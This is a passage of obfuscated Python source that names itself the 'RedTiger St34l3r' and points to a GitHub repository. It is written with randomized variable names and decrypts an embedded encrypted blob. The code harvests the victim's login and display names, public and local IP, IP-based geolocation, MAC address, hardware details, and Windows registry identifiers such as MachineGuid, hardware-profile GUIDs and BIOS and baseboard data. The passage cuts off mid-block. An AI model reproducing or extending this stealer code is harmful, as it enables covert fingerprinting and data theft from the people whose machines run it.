try: CAYZQTAYKWJCOCEVLLWWIHEGJRZOBUOYTUFFFPOKOEXZTQFVBSRWIFZCHGUNMSAMIELMFKHI    = os.getlogin()
except: CAYZQTAYKWJCOCEVLLWWIHEGJRZOBUOYTUFFFPOKOEXZTQFVBSRWIFZCHGUNMSAMIELMFKHI = "None"

try: SNIMDDFAARRXYCWVXBLSCMMGQXZBCUWDWUKRLEDVGSECJRJLXNWCJMBYHYW    = win32api.GetUserNameEx(win32api.NameDisplay)
except: SNIMDDFAARRXYCWVXBLSCMMGQXZBCUWDWUKRLEDVGSECJRJLXNWCJMBYHYW = "None"

try: HOYOUCWQGHITKOIBXOPAFBIZOTICFURVECQEFJMENZDKEZRBVLCOCKGKUPOVFLDXKCXRVNRUOZSDZGNLEQNSRZZRDTFDIFTHL    = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
except: HOYOUCWQGHITKOIBXOPAFBIZOTICFURVECQEFJMENZDKEZRBVLCOCKGKUPOVFLDXKCXRVNRUOZSDZGNLEQNSRZZRDTFDIFTHL = "None"

try: QEHZJJFZALHSGYQHDNUNFSQMCDUAWFPVOOMSTPFZGJURFVNLXRTUD    = socket.gethostbyname(socket.gethostname())
except: QEHZJJFZALHSGYQHDNUNFSQMCDUAWFPVOOMSTPFZGJURFVNLXRTUD = "None"

NXDGERFUEUPPUMHTCFAZNFUKZGQACEYIXVLUWIHPUKXVCQIIIHQYRYI = r"""
ricCZCTuHPuq4Tcsklj/zpoyvnVIJzASO323j9gemmUFQcAfYAy+hvzvx0lUfDFCtDMZSUJ7egKFhVoNS1X7YSMy5/cAd9xWbirrgkWy50UnpBB/DXQhnsimoWdsLbelea0LMZQdzO1P0I8ET3XWEFiuBv3yIVdpGMfUdA/JmAxUaUTpVj+/ERdgGLTzRVEd82aM/ve6tf3B8MDThv2UzA==
"""

VLCFSUTTAMSCRHJYYUFRREKLPMQGNLPTSVPPTSTMWGZMJXJTXHXRRSSXLOAHZYYHRFDJLTRQMCLSKBYRVTMDMGGRYTIQAXCGJL            = "VWQaLexfVQHriYlBxakYQPhXpnjWPRFtnsYqdoGdiIhtNyybrPhOmVhDyNxioWfBbqbvDKhYEMVHUchIbuBKrHaQFenRzcnsfGQHqFvuHkgtXqnuC"
JEMPFEBBYGEOAMOECNRNOBUVGDWSHPFQGOODCKGQKQLUTBTTQSYDFQEGQTONBJZEYPUUAZCCCJEOQW        = "None"
AYJBAAQFXHWGWWUODTJYHAUQYIZKKYHDEXFMBYYYJBRPRMKLMAONP    = 0xa80505
GKWMWGMNRTMNLHJXJKECQAQODFSIWYQMPHJXRBVIJYZDRIFHOUTZJPHDNCMFCEEZRODGZOUBVLUWKVIRGU = "RedTiger St34l3r"
CREPNGVJWOMVBJIPFFVLZRBVMJKJTIQDHQMJNUZXYGKRICETYVFNGEJZBIQNZITRLWCNFSCEESJREABYKYPDDICGOW   = "https://google.com"
EVWPJGIPRPTJMCAPHCKLAFCLTEEYWGEKNYFAJJLGPTJHJGCLYSPKCQC    = "RedTiger St34l3r - github.com/loxy0dev/RedTiger-Tools"
KKTIZRYCSMXOBKOWOOKYKKZXTZVKUGAOHGNWPJAFTIZAYROFOKIEYSEOVTNVJEJMQIEQWIMILVKERUETTLKSHBDOEXNKNCNZ   = {"text": EVWPJGIPRPTJMCAPHCKLAFCLTEEYWGEKNYFAJJLGPTJHJGCLYSPKCQC, "icon_url": CREPNGVJWOMVBJIPFFVLZRBVMJKJTIQDHQMJNUZXYGKRICETYVFNGEJZBIQNZITRLWCNFSCEESJREABYKYPDDICGOW}
JTNYEZUHNDVEPHXYLJTDBQSYYRWWLEZTZHHYBPNLMJEGRHTDBXBCEDJTOECTEZOWU    = f'`{CAYZQTAYKWJCOCEVLLWWIHEGJRZOBUOYTUFFFPOKOEXZTQFVBSRWIFZCHGUNMSAMIELMFKHI} "{HOYOUCWQGHITKOIBXOPAFBIZOTICFURVECQEFJMENZDKEZRBVLCOCKGKUPOVFLDXKCXRVNRUOZSDZGNLEQNSRZZRDTFDIFTHL}"`'
UGPNNDXWBLWFMCAHXQDDHQVIYLHHVKBFICGKAJHSLWOVUXGAXIA    = OGPEXAMMLQCTCCGKKRBMDMPUBJWXMJBVVZVRUWRAWRGQGJDKPSCORUDUAPTQHASCPOMCLZXCPCSH(NXDGERFUEUPPUMHTCFAZNFUKZGQACEYIXVLUWIHPUKXVCQIIIHQYRYI, VLCFSUTTAMSCRHJYYUFRREKLPMQGNLPTSVPPTSTMWGZMJXJTXHXRRSSXLOAHZYYHRFDJLTRQMCLSKBYRVTMDMGGRYTIQAXCGJL)

BNLMSSAWDVYOGIOQADIEUBMVLJPJFSBNFQXDHFFIWXYREPIIXDSSQOIVKVQZX           = os.getenv("WINDIR", None)
BLQCBPFSBNWTWXVRWCLYQUEKHYSEOHCKOPETHQWSGNMPDWGVBHXVQAZXEDQIFUXSEWDWPSGKCOLMYQWFXADLJXGNQRVBFNNRDB       = os.getenv('USERPROFILE', None)
RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ     = os.getenv('LOCALAPPDATA', None)
SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB   = os.getenv('APPDATA', None)
AOTZKNKKQBMWJKZTYVAXMFJPDMRCMIPBBVYWOYTWJOSBNRHUPGBLXPEBNSETGQGZGZAMPPNNFGNJEDAFOPDKZJZPE = os.getenv('ProgramFiles(x86)', None)
if AOTZKNKKQBMWJKZTYVAXMFJPDMRCMIPBBVYWOYTWJOSBNRHUPGBLXPEBNSETGQGZGZAMPPNNFGNJEDAFOPDKZJZPE is None:
    AOTZKNKKQBMWJKZTYVAXMFJPDMRCMIPBBVYWOYTWJOSBNRHUPGBLXPEBNSETGQGZGZAMPPNNFGNJEDAFOPDKZJZPE = os.getenv('ProgramFiles', None)

try:
    DWOOFIVLNXYZDDMBRJOJKPDLFEQXZAXKEABDZWQHAKALYGEZBLDBCBPSGEEBAGXYABTAKZMQDPVKIGHRQMORTLEEGDWUBC = requests.get(f"https://{JEMPFEBBYGEOAMOECNRNOBUVGDWSHPFQGOODCKGQKQLUTBTTQSYDFQEGQTONBJZEYPUUAZCCCJEOQW}/api/ip/ip={HOYOUCWQGHITKOIBXOPAFBIZOTICFURVECQEFJMENZDKEZRBVLCOCKGKUPOVFLDXKCXRVNRUOZSDZGNLEQNSRZZRDTFDIFTHL}")
    GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD = DWOOFIVLNXYZDDMBRJOJKPDLFEQXZAXKEABDZWQHAKALYGEZBLDBCBPSGEEBAGXYABTAKZMQDPVKIGHRQMORTLEEGDWUBC.json()

    HUVSFNVRXHWIZEWBIVNHLCJAHDVKLXJGDFMXQWKVZXPWURWKUXRKWDLZNAKKMPECYVQZRVQQV = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('country', "None")
    HUVSFNVRXHWIZEWBIVNHLCJAHDVKLXJGDFMXQWKVZXPWURWKUXRKWDLZNAKKMPECYVQZRVQQV_code = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('country_code', "None")
    MFIXSSUIDGLWAHGIMMFYTPUNJRLDWBJXHCJVWCCKBWSLZMPZGUPDQYGPOCIZBIUEFDFXDBPCSWJVOUOMFKFHJBTOQJZSL = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('region', "None")
    MFIXSSUIDGLWAHGIMMFYTPUNJRLDWBJXHCJVWCCKBWSLZMPZGUPDQYGPOCIZBIUEFDFXDBPCSWJVOUOMFKFHJBTOQJZSL_code = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('region_code', "None")
    YNKTNQEWSDVDWEOYXJBHOGGGCHVBNBQCMDQQYKKQDUGMQCZLWVJKLQLNZRUOMKNDSMUJYBMQYQOCCSEHHTUISLGDOKAGIBDWRIUE = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('zip', "None")
    DJMRWGCXADNFQAPLGRSKHMKEIAAZZPMNKFZXTFKDHCOGHJOKQJTDIIVANOS = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('city', "None")
    ZXXGMFOQXJAAAEOWAWLQJFWQJLISIDRMLQUMYTJGOMORYGMQLJGKVPTYVFQIAWYAAPAIZKDOFDY = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('latitude', "None")
    IWBWNACUJKILNUMGTOCGAUSFUWGKQHTYCFZBARQKEBFJLEQULDFQHRUOZKOQHWAKOSWZIIJOWNMNTKGFBCGDJLDDZFBCUQVJB = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('longitude', "None")
    FSBWRNBXKUZSZZFSJANHAEFDEVOWFBFQZUPLULKICEAZMAUTVDBUFQXYHW = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('timezone', "None")
    WTQUKKKDWPWSVWUFJSDRFTAIIZECRDRGTEBAJSXWMXKZYYSXQUWXTIODGHODBMNVKXLNNMDETOEMICMNZRQP = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('isp', "None")
    ECHCOWGFAOCRCPZIQSWOAUBXRCODSYFYSXIZTPDMDMQGXYKYTQTTSACIXUVCKIVXJHADLDWHPCLMSUYZAUEUFNRA = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('org', "None")
    FZGAVZSQIRVVRHCMPOTNUTPYIYPTEPHVDBKBXOHRFHOXWVOGTLYBKITRHPCMUUKUMJIXCXWXS = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('as', "None")
except:
    DWOOFIVLNXYZDDMBRJOJKPDLFEQXZAXKEABDZWQHAKALYGEZBLDBCBPSGEEBAGXYABTAKZMQDPVKIGHRQMORTLEEGDWUBC = requests.get(f"http://ip-api.com/json/{HOYOUCWQGHITKOIBXOPAFBIZOTICFURVECQEFJMENZDKEZRBVLCOCKGKUPOVFLDXKCXRVNRUOZSDZGNLEQNSRZZRDTFDIFTHL}")
    GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD = DWOOFIVLNXYZDDMBRJOJKPDLFEQXZAXKEABDZWQHAKALYGEZBLDBCBPSGEEBAGXYABTAKZMQDPVKIGHRQMORTLEEGDWUBC.json()

    HUVSFNVRXHWIZEWBIVNHLCJAHDVKLXJGDFMXQWKVZXPWURWKUXRKWDLZNAKKMPECYVQZRVQQV = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('country', "None")
    HUVSFNVRXHWIZEWBIVNHLCJAHDVKLXJGDFMXQWKVZXPWURWKUXRKWDLZNAKKMPECYVQZRVQQV_code = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('countryCode', "None")
    MFIXSSUIDGLWAHGIMMFYTPUNJRLDWBJXHCJVWCCKBWSLZMPZGUPDQYGPOCIZBIUEFDFXDBPCSWJVOUOMFKFHJBTOQJZSL = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('regionName', "None")
    MFIXSSUIDGLWAHGIMMFYTPUNJRLDWBJXHCJVWCCKBWSLZMPZGUPDQYGPOCIZBIUEFDFXDBPCSWJVOUOMFKFHJBTOQJZSL_code = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('region', "None")
    YNKTNQEWSDVDWEOYXJBHOGGGCHVBNBQCMDQQYKKQDUGMQCZLWVJKLQLNZRUOMKNDSMUJYBMQYQOCCSEHHTUISLGDOKAGIBDWRIUE = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('zip', "None")
    DJMRWGCXADNFQAPLGRSKHMKEIAAZZPMNKFZXTFKDHCOGHJOKQJTDIIVANOS = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('city', "None")
    ZXXGMFOQXJAAAEOWAWLQJFWQJLISIDRMLQUMYTJGOMORYGMQLJGKVPTYVFQIAWYAAPAIZKDOFDY = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('lat', "None")
    IWBWNACUJKILNUMGTOCGAUSFUWGKQHTYCFZBARQKEBFJLEQULDFQHRUOZKOQHWAKOSWZIIJOWNMNTKGFBCGDJLDDZFBCUQVJB = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('lon', "None")
    FSBWRNBXKUZSZZFSJANHAEFDEVOWFBFQZUPLULKICEAZMAUTVDBUFQXYHW = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('timezone', "None")
    WTQUKKKDWPWSVWUFJSDRFTAIIZECRDRGTEBAJSXWMXKZYYSXQUWXTIODGHODBMNVKXLNNMDETOEMICMNZRQP = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('isp', "None")
    ECHCOWGFAOCRCPZIQSWOAUBXRCODSYFYSXIZTPDMDMQGXYKYTQTTSACIXUVCKIVXJHADLDWHPCLMSUYZAUEUFNRA = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('org', "None")
    FZGAVZSQIRVVRHCMPOTNUTPYIYPTEPHVDBKBXOHRFHOXWVOGTLYBKITRHPCMUUKUMJIXCXWXS = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('as', "None")

def EJHGTQEIMBHTHAHNWHITNBKLVLRQMDZHUWXHPMFJZVXOYSJCZORZQGPDYPLUKKJHOFXVNMRXIBLDRMV(BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI):
    import platform
    import subprocess
    import uuid
    import psutil
    import GPUtil
    import ctypes
    import win32api
    import string
    import screeninfo
    import winreg

    try: MXIRPIXBYVRMKVQXHAUEAYZRVIAVGFSZZYPRJBYJKORFLUUPNFHQFCEGFZLWYASSMPRLPLOEMYOSMPOMOYL = platform.system()
    except: MXIRPIXBYVRMKVQXHAUEAYZRVIAVGFSZZYPRJBYJKORFLUUPNFHQFCEGFZLWYASSMPRLPLOEMYOSMPOMOYL = "None"

    try: MADKDVLVWDJMBDIMBHXMHFWOFLATBDGEGUQGBCYNVAIFKXZHZASOWNOWOHKUCMPYBQICJUJBIPKTUKIFOTP = platform.version()
    except: MADKDVLVWDJMBDIMBHXMHFWOFLATBDGEGUQGBCYNVAIFKXZHZASOWNOWOHKUCMPYBQICJUJBIPKTUKIFOTP = "None"

    try: DYCEIPTZZAKJDISLFFOKKKKFVCGWFVLNHIMXFBYBAYMPXOFZLKEXYSBMKXNGBYLRGVOIKUQFZFZZUY = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except: DYCEIPTZZAKJDISLFFOKKKKFVCGWFVLNHIMXFBYBAYMPXOFZLKEXYSBMKXNGBYLRGVOIKUQFZFZZUY = "None"

    try: FPYSXSRIJBWHEOWSMBEMXDLWQHNDTFKEZMRFYATFROQQLFXXHPDCCNLOSRYRJGAEZRCAXJLUNPKEANTHQCDKIZ = str(round(psutil.virtual_memory().total / (1024**3), 2)) + "Go"
    except: FPYSXSRIJBWHEOWSMBEMXDLWQHNDTFKEZMRFYATFROQQLFXXHPDCCNLOSRYRJGAEZRCAXJLUNPKEANTHQCDKIZ = "None"

    try: NLYWZNNPZOEFKRZGBLDTTNJYIRQKAVMTTOLNPIJVYFZNJAUCPHXX = platform.processor()
    except: NLYWZNNPZOEFKRZGBLDTTNJYIRQKAVMTTOLNPIJVYFZNJAUCPHXX = "None"

    try: NJMLBZMDQNXWUMBSMTEFLUILQEJPROCWPBSNTLUHAPRJFFVUDEMCUYRAYTASTVMSRQPTIRSJ = str(psutil.cpu_count(logical=False)) + " Core"
    except: NJMLBZMDQNXWUMBSMTEFLUILQEJPROCWPBSNTLUHAPRJFFVUDEMCUYRAYTASTVMSRQPTIRSJ = "None"

    try: LEERNKBLJUHYLOPJFRLWESPZOEVOJMXMULPNTXJHPKAWGDOQOVAULXGZAJPTDSATWMVNGQWJPNPZ = GPUtil.getGPUs()[0].name if GPUtil.getGPUs() else "None"
    except: LEERNKBLJUHYLOPJFRLWESPZOEVOJMXMULPNTXJHPKAWGDOQOVAULXGZAJPTDSATWMVNGQWJPNPZ = "None"

    DXWEVBWOHUZJYLMXFUDCLEWDKJYRAENMMQKCPWUKREKPSYYSCFXZEVRYLWKQBYCEMAPACTEZPUNQJNIGYM                 = r"SOFTWARE\Microsoft\Cryptography"
    EZTUQIJAQWWWRYOTPQHUXPHRJUXGIJPKDNTKFAWOMQXQKLCQOOEHKSMDQKSEYLARFTLOARZGUOWY                    = r"SOFTWARE\Microsoft\SQMClient"
    UUNLAMESGMFBHVKIOWSQDUFUGOYDFZSBIVSOQVZRXSNRJHFRXKIYJBZMMBITZBSBSLROCHAJZSHIHLCNZHBQXDYRVGQ             = r"SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001"
    UIYSSRIXZNTXBDSLWSMMNIPLLNFUAFVWCLYZFXENAPAICHWKHJCKEYFYPEBKQVBVAZLPBOKHBPUFTUOZ                       = r'SOFTWARE\NVIDIA Corporation'
    GKKNAFVZEBEEYAIOXDEUGDNAJUIXHLFPNBJGMSWVFQLGUMFJGLI               = r'SYSTEM\HardwareConfig\Current'

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, DXWEVBWOHUZJYLMXFUDCLEWDKJYRAENMMQKCPWUKREKPSYYSCFXZEVRYLWKQBYCEMAPACTEZPUNQJNIGYM, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "MachineGuid")
            JUDWFIGUHQAWSVJYBRGMTOPMHWTRCKGBPOXJRHGAGWDHACYWHIXFERIGCUAWOGVDPJHYMLPJIDI = str(v4r_value).replace("{", "").replace("}", "")
    except: JUDWFIGUHQAWSVJYBRGMTOPMHWTRCKGBPOXJRHGAGWDHACYWHIXFERIGCUAWOGVDPJHYMLPJIDI = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, UUNLAMESGMFBHVKIOWSQDUFUGOYDFZSBIVSOQVZRXSNRJHFRXKIYJBZMMBITZBSBSLROCHAJZSHIHLCNZHBQXDYRVGQ, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "GUID")
            PZEISHNRSYEZNFHEYYIXWQAOAFKEMVQFZAPBGDDALBXHVNRFIQRGOXXTKCZTTCNFXFGQOKYVPFMXYPCPBLNPNYILZICTPKGK = str(v4r_value).replace("{", "").replace("}", "")
    except: PZEISHNRSYEZNFHEYYIXWQAOAFKEMVQFZAPBGDDALBXHVNRFIQRGOXXTKCZTTCNFXFGQOKYVPFMXYPCPBLNPNYILZICTPKGK = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, UUNLAMESGMFBHVKIOWSQDUFUGOYDFZSBIVSOQVZRXSNRJHFRXKIYJBZMMBITZBSBSLROCHAJZSHIHLCNZHBQXDYRVGQ, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "HwProfileGuid")
            WKHRZHVPAMUXHDFBKFDHUIUTYVEARMDHGFDCKROSJMNOFQHMBJYIDKGQSFDZXWETYZPEKRYWH = str(v4r_value).replace("{", "").replace("}", "")
    except: WKHRZHVPAMUXHDFBKFDHUIUTYVEARMDHGFDCKROSJMNOFQHMBJYIDKGQSFDZXWETYZPEKRYWH = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, EZTUQIJAQWWWRYOTPQHUXPHRJUXGIJPKDNTKFAWOMQXQKLCQOOEHKSMDQKSEYLARFTLOARZGUOWY, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "MachineId")
            KOFTGXTFHCXKHDBRKYICBUKNUBMYRGLYCGVDPQBSBCZUJXMHRWIYKQVSINQPJLVRYRTKNUASCECFCKVD = str(v4r_value).replace("{", "").replace("}", "")
    except: KOFTGXTFHCXKHDBRKYICBUKNUBMYRGLYCGVDPQBSBCZUJXMHRWIYKQVSINQPJLVRYRTKNUASCECFCKVD = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, UIYSSRIXZNTXBDSLWSMMNIPLLNFUAFVWCLYZFXENAPAICHWKHJCKEYFYPEBKQVBVAZLPBOKHBPUFTUOZ+r'\Installer2', 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemID")
            JGRYWBJGNMCKJQKGTEATADPRKDOZPESFFLPQAKKCJYHPNLSBRLYTSKNBQIDSVALTUDHSMLQZMGGVOSWDC = str(v4r_value).replace("{", "").replace("}", "")
    except: JGRYWBJGNMCKJQKGTEATADPRKDOZPESFFLPQAKKCJYHPNLSBRLYTSKNBQIDSVALTUDHSMLQZMGGVOSWDC = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, GKKNAFVZEBEEYAIOXDEUGDNAJUIXHLFPNBJGMSWVFQLGUMFJGLI, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BaseBoardProduct")
            OSKBLIJAWDBXSFGHUKWZTKGUTGTUFWQEFINJNVMSBRGYLFKLVHPQNBZIPAHTOJFNVLHXMHOHCZURTIEWN = str(v4r_value).replace("{", "").replace("}", "")
    except: OSKBLIJAWDBXSFGHUKWZTKGUTGTUFWQEFINJNVMSBRGYLFKLVHPQNBZIPAHTOJFNVLHXMHOHCZURTIEWN = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, GKKNAFVZEBEEYAIOXDEUGDNAJUIXHLFPNBJGMSWVFQLGUMFJGLI, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BaseBoardManufacturer")
            MPFPKSYZRJOHYMJIPAUWTHZPKWUGVGVKKIVMVMROORETKCWHMUUYNSRKAVYSIZLFTIPSYEHSMLXRCPICRHTMJLXBBNCAMXIF = str(v4r_value).replace("{", "").replace("}", "")
    except: MPFPKSYZRJOHYMJIPAUWTHZPKWUGVGVKKIVMVMROORETKCWHMUUYNSRKAVYSIZLFTIPSYEHSMLXRCPICRHTMJLXBBNCAMXIF = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, GKKNAFVZEBEEYAIOXDEUGDNAJUIXHLFPNBJGMSWVFQLGUMFJGLI, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BIOSReleaseDate")
            MFGBKSHMDKOJKLLVIVWRPJDFPAZMGPCZEZHPARTTWNVRORZLKAYPKEPDPYNMNOKKUDCBPYIZAQLTAFHVAOBREGICFIDZLUA = str(v4r_value).replace("{", "").replace("}", "")
    except: MFGBKSHMDKOJKLLVIVWRPJDFPAZMGPCZEZHPARTTWNVRORZLKAYPKEPDPYNMNOKKUDCBPYIZAQLTAFHVAOBREGICFIDZLUA = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, GKKNAFVZEBEEYAIOXDEUGDNAJUIXHLFPNBJGMSWVFQLGUMFJGLI, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BIOSVersion")
            SPFSPXTPLGEFMXYLFROEGECTNQMPKDSDVQEWVXYAQQMNUPMYDJTNFSHOOTXQUNRHATLHHXKOZPROFJIPHTHVLA = str(v4r_value).replace("{", "").replace("}", "")
    except: SPFSPXTPLGEFMXYLFROEGECTNQMPKDSDVQEWVXYAQQMNUPMYDJTNFSHOOTXQUNRHATLHHXKOZPROFJIPHTHVLA = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, GKKNAFVZEBEEYAIOXDEUGDNAJUIXHLFPNBJGMSWVFQLGUMFJGLI, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemBiosVersion")
            EPXKOGEDFXRIBBHKXYVVMEKBLIDTHTYBJYZESXPDPIQPYDGKCPVBBLROUZFQMTOSFNAKGZVGGHIOPHFOMHCAJCTTCSHXOKUZU = str(v4r_value).replace("{", "").replace("}", "")
    except: EPXKOGEDFXRIBBHKXYVVMEKBLIDTHTYBJYZESXPDPIQPYDGKCPVBBLROUZFQMTOSFNAKGZVGGHIOPHFOMHCAJCTTCSHXOKUZU = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, GKKNAFVZEBEEYAIOXDEUGDNAJUIXHLFPNBJGMSWVFQLGUMFJGLI, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemVersion")
            LWMQVNURTMMUBFQSYKUGUPIUIXFMVTJGHGWZNJEMWCHQODZFIYTEQBFWUWXORNGEUMAVYVJNQDGMXKLCHMTYPGJYKTKWAV = str(v4r_value).replace("{", "").replace("}", "")
    except: LWMQVNURTMMUBFQSYKUGUPIUIXFMVTJGHGWZNJEMWCHQODZFIYTEQBFWUWXORNGEUMAVYVJNQDGMXKLCHMTYPGJYKTKWAV = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, GKKNAFVZEBEEYAIOXDEUGDNAJUIXHLFPNBJGMSWVFQLGUMFJGLI, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemFamily")
            MONADDDSLGUUJEIVVVTLHXLBUXFWOLRITKRVPYEQANIGHKQQYNASEABXWZULGVZHVJVMYKGTLLKGQNQGK = str(v4r_value).replace("{", "").replace("}", "")
    except: MONADDDSLGUUJEIVVVTLHXLBUXFWOLRITKRVPYEQANIGHKQQYNASEABXWZULGVZHVJVMYKGTLLKGQNQGK = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, GKKNAFVZEBEEYAIOXDEUGDNAJUIXHLFPNBJGMSWVFQLGUMFJGLI, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemManufacturer")
            TTXYZNTTHQQCLLIHDCMVXMBQCFCBMMWNXKWDFPWTBOJUBVWPKCVWITZWIJITHHEWGEYZ = str(v4r_value).replace("{", "").replace("}", "")
    except: TTXYZNTTHQQCLLIHDCMVXMBQCFCBMMWNXKWDFPWTBOJUBVWPKCVWITZWIJITHHEWGEYZ = None

    try:
